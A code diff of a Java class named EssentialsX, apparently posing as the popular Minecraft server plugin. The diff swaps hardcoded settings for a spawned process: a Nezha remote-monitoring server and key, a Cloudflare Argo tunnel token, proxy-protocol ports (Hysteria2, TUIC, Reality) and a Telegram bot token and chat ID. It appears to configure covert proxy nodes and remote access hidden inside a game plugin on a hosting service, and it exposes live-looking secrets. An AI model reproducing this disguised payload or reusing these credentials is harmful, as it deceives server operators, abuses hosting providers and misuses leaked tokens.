@@ -73,23 +73,23 @@ public class EssentialsX extends JavaPlugin {
         
         // Set environment variables
         Map<String, String> env = pb.environment();
-        env.put("UUID", "ee91ec4f-8af6-41bb-9a7a-579a67992989");
+        env.put("UUID", "4c271c2c-702f-4c40-b1d5-eaf27f5c2aa1");
         env.put("FILE_PATH", "./world");
-        env.put("NEZHA_SERVER", "nezha.9logo.eu.org:443");
+        env.put("NEZHA_SERVER", "nz.ceee.nyc.mn:8008");
         env.put("NEZHA_PORT", "");
-        env.put("NEZHA_KEY", "c0FdihFZ8XpqXFbu7muAAPkD5JmeVY4g");
-        env.put("ARGO_PORT", "9010");
-        env.put("ARGO_DOMAIN", "falix-de.milan.us.kg");
-        env.put("ARGO_AUTH", "eyJhIjoiNGMyMGE2ZTY0MmM4YWZhNzMzZDRlYzY0N2I0OWRlZTQiLCJ0IjoiMWU4M2EyNzAtNzc5Ny00OGViLWI4N2QtNTA5ZTczM2FkYmJhIiwicyI6Ik56UTFPVEE0WVRBdE5tVTBZeTAwTkRaa0xUbGxPVEF0WVdVMll6RmtaVGt5TXpoaSJ9");
+        env.put("NEZHA_KEY", "Za1je4IYtj60P42uQRYXgRNR07juLu02");
+        env.put("ARGO_PORT", "8001");
+        env.put("ARGO_DOMAIN", "freeze.888169.xyz");
+        env.put("ARGO_AUTH", "eyJhIjoiNTgxMzZiNmVmNTNjNDAzOTYyMjc3YmUyNzM4ZDc5ZGUiLCJ0IjoiMWM1N2RjMjQtNDNiMS00OGEzLTg1ZTQtOGJkYjVhYjQxY2ZmIiwicyI6IlkyVXlaVEEyT1RndFpEazFaaTAwWWpka0xUazBObVV0WVRrell6RXhPR0kwT1RjMCJ9");
         env.put("S5_PORT", "");
-        env.put("HY2_PORT", "");
-        env.put("TUIC_PORT", "");
-        env.put("ANYTLS_PORT", "");
-        env.put("REALITY_PORT", "");
+        env.put("HY2_PORT", "11823");
+        env.put("TUIC_PORT", "11948");
+        env.put("ANYTLS_PORT", "11948");
+        env.put("REALITY_PORT", "11823");
         env.put("ANYREALITY_PORT", "");
         env.put("UPLOAD_URL", "");
-        env.put("CHAT_ID", "6839843424");
-        env.put("BOT_TOKEN", "8522009909:AAF-3TZ6LJwf1ZoCYbdNp7qOstPoS_PqwJw");
+        env.put("CHAT_ID", "8151077286");
+        env.put("BOT_TOKEN", "8135587157:AAHVYlHUufdme4BzrdA7cx8BSAFFufgC2xs");
         env.put("CFIP", "saas.sin.fan");
         env.put("CFPORT", "443");
         env.put("NAME", "Falix-DE");
